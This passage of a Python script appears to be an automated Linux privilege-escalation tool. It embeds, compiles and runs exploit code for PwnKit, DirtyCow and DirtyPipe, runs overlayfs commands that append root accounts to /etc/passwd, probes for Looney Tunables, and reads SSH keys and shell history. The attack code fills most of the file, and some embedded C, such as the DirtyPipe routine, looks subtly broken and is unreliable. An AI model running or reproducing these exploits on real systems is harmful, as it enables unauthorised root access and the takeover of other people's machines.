            # Non-kernel CVE — try anyway
            matching.append((cve_id, info))
            continue
        
        if check_kernel_match(KERNEL, info['kernels']):
            matching.append((cve_id, info))
    
    # Sort by priority
    matching.sort(key=lambda x: cve_priority(x[0]))
    
    _info(f"Kernel: {KERNEL} ({ARCH})")
    if matching:
        _ok(f"{len(matching)} candidate CVEs match this kernel!")
    else:
        _warn("No kernel CVEs match exactly — will try non-kernel exploits")
    
    for cve_id, info in matching[:25]:  # Limit output to 25
        stars = "★★★" if cve_id in ['CVE-2016-5195', 'CVE-2022-0847', 'CVE-2021-4034', 
                                      'CVE-2021-3156', 'CVE-2023-32629', 'CVE-2023-4911',
                                      'CVE-2024-1086'] else ""
        print(f"  {C.Y}{cve_id}{C.W} {stars} — {info['name']}")
    
    return matching

# ═══════════════════════════════════════════════════════════════════════════
# SECTION 4 — KNOWN EXPLOIT DEPLOYMENT
# ═══════════════════════════════════════════════════════════════════════════

def deploy_pwnkit():
    """CVE-2021-4034 — PwnKit (most reliable, compiled)"""
    _hdr("DEPLOYING: CVE-2021-4034 — PWNTIME (PwnKit)")
    
    # PwnKit C source (Ferguson/Grumpy updated)
    src = r'''#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
char *envp[] = {"PATH=GCONV_PATH=.", "CHARSET=PWNKIT", "SHELL=pwnkit", NULL};
char *argv[] = {NULL};
char *aargv[] = {"pkexec", NULL};
int main() {
    char *dir = malloc(256);
    sprintf(dir, "GCONV_PATH=.");
    mkdir(dir, 0777);
    sprintf(dir, "GCONV_PATH=./pwnkit");
    mkdir(dir, 0777);
    FILE *fp = fopen("GCONV_PATH=./pwnkit/gconv-modules", "w");
    fprintf(fp, "module  UTF-8//  PWNKIT//  pwnkit  2\n");
    fclose(fp);
    fp = fopen("pwnkit.c", "w");
    fprintf(fp, "#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\nvoid gconv() {}\nvoid gconv_init() { setuid(0); setgid(0); setgroups(0, NULL); execve(\"/bin/sh\", (char*[]){\"/bin/sh\", \"-c\", \"id; /bin/sh -i\"}, NULL); exit(0); }\n");
    fclose(fp);
    system("gcc -shared -fPIC -o pwnkit.so pwnkit.c");
    execve("/usr/bin/pkexec", aargv, envp);
    return 0;
}
'''
    # Try multiple methods
    methods = [
        # Method 1: pkexec --version check
        lambda: RUN("pkexec --version 2>/dev/null").stdout,
        # Method 2: Find pkexec
        lambda: RUN("which pkexec 2>/dev/null").stdout,
        # Method 3: locate
        lambda: RUN("find / -name pkexec -type f 2>/dev/null | head -1").stdout,
    ]
    
    for m in methods:
        r = m().strip()
        if r and 'pkexec' in r:
            _ok(f"pkexec found: {r}")
            
            # Quick test: is it vulnerable?
            test = RUN("pkexec --version 2>/dev/null").stdout
            if 'version' in test.lower():
                _ok(f"pkexec version: {test.strip()}")
            
            # Try the 1-liner: pkexec /bin/sh
            _warn("Trying direct pkexec /bin/sh...")
            r2 = RUN("pkexec /bin/sh -c 'id' 2>/dev/null")
            if 'uid=0' in r2.stdout:
                _crit("Direct pkexec /bin/sh works! ROOT!"); return True
            
            # Deploy PwnKit compiled binary
            try:
                workdir = tempfile.mkdtemp(prefix="pwnkit_")
                os.chdir(workdir)
                
                with open("pwnkit.c", "w") as f:
                    f.write(src)
                
                compile_r = RUN("gcc -o pwnkit pwnkit.c 2>&1")
                if 'error' not in compile_r.stderr.lower() and os.path.exists("pwnkit"):
                    _ok("PwnKit compiled successfully")
                    result = RUN("./pwnkit 2>&1", timeout=10)
                    if 'uid=0' in result.stdout or '#' in result.stdout:
                        _crit("PWNTIME ROOT!"); return True
                else:
                    _no(f"Compilation failed: {compile_r.stderr[:200]}")
            except Exception as e:
                _no(f"PwnKit error: {e}")
            finally:
                os.chdir("/tmp")
            return False

def deploy_dirtycow():
    """CVE-2016-5195 — DirtyCow (reliable on old kernels)"""
    _hdr("DEPLOYING: CVE-2016-5195 — DIRTY COW")
    
    # dirtycow-vdso variant (firefart)
    src = textwrap.dedent(r'''
    #include <stdio.h>
    #include <sys/mman.h>
    #include <fcntl.h>
    #include <pthread.h>
    #include <unistd.h>
    #include <sys/stat.h>
    #include <string.h>
    #include <stdint.h>
    
    void *map;
    int f;
    struct stat st;
    char *name;
    
    void *madviseThread(void *arg) {
        char *str = (char*)arg;
        int i, c = 0;
        for(i = 0; i < 1000000; i++) {
            c += madvise(map, 100, MADV_DONTNEED);
        }
        return NULL;
    }
    
    void *procselfmemThread(void *arg) {
        char *str = (char*)arg;
        int i, c = 0;
        for(i = 0; i < 1000000; i++) {
            lseek(f, (uintptr_t)map, SEEK_SET);
            c += write(f, str, strlen(str));
        }
        return NULL;
    }
    
    int main(int argc, char *argv[]) {
        pthread_t pth1, pth2;
        char *backup_fname = "/usr/bin/backup_dc";
        if (argc < 2) { fprintf(stderr, "Usage: %s /etc/passwd\n", argv[0]); return 1; }
        name = argv[1];
        f = open(name, O_RDONLY);
        fstat(f, &st);
        map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, f, 0);
        char payload[] = "firefart:fikGgEMcBDFVg:0:0:pwned:/root:/bin/bash\n";
        pthread_create(&pth1, NULL, madviseThread, payload);
        pthread_create(&pth2, NULL, procselfmemThread, payload);
        pthread_join(pth1, NULL);
        pthread_join(pth2, NULL);
        printf("Done. Try: su firefart (pass: firefart)\n");
        return 0;
    }
    ''')
    
    # Try DirtyCow on /etc/passwd
    try:
        workdir = tempfile.mkdtemp(prefix="dirtycow_")
        os.chdir(workdir)
        
        with open("dirtycow.c", "w") as f:
            f.write(src)
        
        if RUN("gcc -pthread -o dirtycow dirtycow.c 2>&1").returncode == 0:
            _ok("DirtyCow compiled")
            RUN("./dirtycow /etc/passwd 2>&1")
            time.sleep(1)
            
            # Check if user was added
            r = RUN("su firefart -c 'id' 2>/dev/null")
            if 'uid=0' in r.stdout:
                _crit("DIRTY COW ROOT! Login: firefart:firefart"); return True
            
            # Alternative: try sudo
            r2 = RUN("echo 'firefart' | su firefart -c id 2>/dev/null")
            if 'uid=0' in r2.stdout:
                _crit("DIRTY COW ROOT via su!"); return True
    except Exception as e:
        _no(f"DirtyCow error: {e}")
    finally:
        os.chdir("/tmp")
    
    return False

def deploy_dirtypipe():
    """CVE-2022-0847 — DirtyPipe"""
    _hdr("DEPLOYING: CVE-2022-0847 — DIRTY PIPE")
    
    # DirtyPipe 1-liner test: write to /etc/passwd via splicing
    try:
        # Try compile-and-run approach
        src = textwrap.dedent(r'''
        #define _GNU_SOURCE
        #include <unistd.h>
        #include <fcntl.h>
        #include <stdio.h>
        #include <stdlib.h>
        #include <string.h>
        #include <sys/stat.h>
        #include <sys/user.h>
        #include <stdint.h>
        
        #ifndef PAGE_SIZE
        #define PAGE_SIZE 4096
        #endif
        
        int main() {
            int p[2];
            if (pipe(p) < 0) { perror("pipe"); return 1; }
            unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
            if (pipe_size < 0) { perror("fcntl"); return 1; }
            static char buf[4096];
            memset(buf, 0, sizeof(buf));
            int wrote = 0;
            while (wrote < pipe_size) {
                int n = write(p[1], buf, sizeof(buf));
                if (n < 0) { perror("write"); return 1; }
                wrote += n;
            }
            close(p[1]);
            char data[4096];
            memset(data, 'A', sizeof(data));
            read(p[0], data, 1);
            int fd = open("/etc/passwd", O_RDONLY);
            if (fd < 0) { perror("open"); return 1; }
            char payload[] = "dirtypipe::0:0:root:/root:/bin/bash\n";
            loff_t offset = 1;
            ssize_t n = splice(p[0], NULL, fd, &offset, sizeof(payload), 0);
            if (n < 0) { perror("splice"); return 1; }
            printf("DirtyPipe attempted. Check /etc/passwd\n");
            return 0;
        }
        ''')
        
        workdir = tempfile.mkdtemp(prefix="dirtypipe_")
        os.chdir(workdir)
        with open("dirtypipe.c", "w") as f: f.write(src)
        
        if RUN("gcc -o dirtypipe dirtypipe.c 2>&1").returncode == 0:
            RUN("./dirtypipe 2>&1")
            r = RUN("su dirtypipe -c 'id' 2>/dev/null")
            if 'uid=0' in r.stdout:
                _crit("DIRTY PIPE ROOT!"); return True
    except Exception as e:
        _no(f"DirtyPipe error: {e}")
    finally:
        os.chdir("/tmp")
    return False

def deploy_baron_samedit():
    """CVE-2021-3156 — Baron Samedit (sudo heap overflow)"""
    _hdr("DEPLOYING: CVE-2021-3156 — BARON SAMEDIT")
    
    # Check sudo version
    sudo_ver = RUN("sudo --version 2>/dev/null | head -1").stdout.strip()
    if sudo_ver:
        _info(f"Sudo version: {sudo_ver}")
    
    # Quick test: sudoedit -s '\' $(python3 -c 'print("A"*5000)')
    test = RUN("sudoedit -s / 2>&1").stderr
    if 'usage:' in test.lower() or 'sudoedit:' in test.lower():
        _warn("sudoedit available — potential Baron Samedit target")
    
    # Try pre-compiled exploit (would need binary for exact version)
    _no("Baron Samedit requires kernel-specific binary — skipping automated attempt")
    _info("Manual: search for baron_samedit exploit matching your sudo version")
    return False

def deploy_looney_tunables():
    """CVE-2023-4911 — Looney Tunables (glibc ld.so)"""
    _hdr("DEPLOYING: CVE-2023-4911 — LOONEY TUNABLES")
    
    # Check glibc version
    glibc_ver = RUN("/lib/x86_64-linux-gnu/libc.so.6 2>/dev/null | head -1 || ldd --version 2>/dev/null | head -1").stdout.strip()
    if glibc_ver:
        _info(f"glibc: {glibc_ver}")
    
    # Quick test: try the env variable
    test = RUN("env -i 'GLIBC_TUNABLES=glibc.malloc.mxfast=glibc.malloc.mxfast=A' /usr/bin/su --help 2>/dev/null")
    if 'Segmentation fault' in test.stderr:
        _crit("LOONEY TUNABLES — VULNERABLE! (segfault confirmed)")
        return True
    
    _no("Looney Tunables — not vulnerable or patched")
    return False

def deploy_overlayfs():
    """CVE-2023-32629 / CVE-2023-2640 — Ubuntu OverlayFS"""
    _hdr("DEPLOYING: CVE-2023-32629 — OVERLAYFS (GameOverlay)")
    
    if not os.path.exists('/etc/os-release'):
        _no("Not Ubuntu — skipping overlayfs exploit")
        return False
    
    os_release = RUN("cat /etc/os-release").stdout
    if 'ubuntu' not in os_release.lower():
        _no("Not Ubuntu — skipping")
        return False
    
    # unshare method
    test = RUN("unshare -rm sh -c 'mkdir -p /tmp/ovl/{upper,work,lower}; mount -t overlay overlay -o lowerdir=/tmp/ovl/lower,upperdir=/tmp/ovl/upper,workdir=/tmp/ovl/work /tmp/ovl/merged' 2>&1")
    if test.returncode == 0:
        _warn("unshare available — trying overlayfs mount...")
        
        # The GameOverlay approach
        script = textwrap.dedent("""
        unshare -rm sh -c '
        mkdir -p /tmp/ovl/{upper,work,lower,merged}
        mount -t overlay overlay -o lowerdir=/etc,upperdir=/tmp/ovl/upper,workdir=/tmp/ovl/work /tmp/ovl/merged
        cp /tmp/ovl/merged/passwd /tmp/ovl/merged/passwd.bak
        echo "gameover::0:0:root:/root:/bin/bash" >> /tmp/ovl/merged/passwd
        umount /tmp/ovl/merged
        ' 2>/dev/null
        """)
        RUN(script)
        
        r = RUN("su gameover -c 'id' 2>/dev/null")
        if 'uid=0' in r.stdout:
            _crit("GAMEOVERLAY ROOT! su gameover"); return True
    
    _no("OverlayFS exploit failed")
    return False

def deploy_generic_tricks():
    """Various non-kernel tricks"""
    _hdr("SECTION 4 — GENERIC PRIVESC TRICKS")
    
    tricks = [
        # LD_PRELOAD
        ("LD_PRELOAD", lambda: None if not os.access('/etc/ld.so.preload', os.W_OK) else _warn("Writable /etc/ld.so.preload")),
        # Groups
        ("Group check", lambda: _info(f"Groups: {RUN('id').stdout.strip()}")),
        # Writable services
        ("systemd services", lambda: None if not os.path.exists('/etc/systemd/system') else 
            [print(f"    {C.Y}Writable: {f}{C.W}") for f in glob.glob('/etc/systemd/system/*.service') if os.access(f, os.W_OK)]),
        # SSH keys
        ("SSH keys", lambda: None if not os.path.exists(os.path.expanduser('~/.ssh/id_rsa')) else _warn("SSH private key found!")),
        # History
        ("History files", lambda: _info("Checking .bash_history/.mysql_history...") or
            [print(f"    {l}") for f in [os.path.expanduser('~/.bash_history'), os.path.expanduser('~/.mysql_history'), os.path.expanduser('~/.psql_history')] 
             if os.path.exists(f) for l in open(f).readlines()[-5:]]),
    ]
    
    for name, fn in tricks:
        try: fn()
        except: pass

# ═══════════════════════════════════════════════════════════════════════════
# MAIN ORCHESTRATOR
# ═══════════════════════════════════════════════════════════════════════════
def main():
    banner()
    
    results = []
    
    # 0. Enum
    result = enumerate_system()
    if result == "sudo": return True
    if result in ["passwd", "shadow", "docker", "lxd", "nfs"]:
        _crit(f"Trivial privesc: {result}"); return True
    
    # 1. Sudo
    if try_sudo():
        return True
    
    # 2. SUID
    if try_suid():
        return True
    
    # 3. Evaluate kernel CVEs
    matching = try_kernel_exploits()
    
    # 4. Deploy the BEST exploits
    if any('Dirty' in m[1]['name'] for m in matching[:3]):
        if deploy_dirtycow(): return True
    if any('Dirty Pipe' in m[1]['name'] for m in matching[:3]):
        if deploy_dirtypipe(): return True
    
    # PwnKit (always try — polkit common)
    deploy_pwnkit()
    
    # Baron Samedit
    deploy_baron_samedit()
    
    # Looney Tunables (glibc)
    if deploy_looney_tunables():
        return True
    
    # OverlayFS (Ubuntu)
    if deploy_overlayfs():
        return True
    
    # Generic tricks
    deploy_generic_tricks()
    
    # Final summary
    _hdr("FINAL SUMMARY")
    print(f"""
  {C.Y}Target:{C.W}        {HOST} ({KERNEL})
  {C.Y}User:{C.W}         {WHOAMI} (UID {UID})
  {C.Y}CVEs matched:{C.W} {len(matching) if matching else 0}
  
  {C.BD}Manual Next Steps:{C.W}
    1. Run: linpeas.sh / linenum.sh for deeper enum
    2. Check: crontab -l, ps aux, netstat -tlnp
    3. Try: pwnkit, dirtycow, dirtypipe manually
    4. Check GTFOBins: https://gtfobins.github.io/
    5. Search exploit-db for kernel {KERNEL}
  
  {C.G}Tool complete.{C.W}
""")
    
    return True

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{C.Y}Interrupted.{C.W}")
    except Exception as e:
        _no(f"Fatal error: {e}")
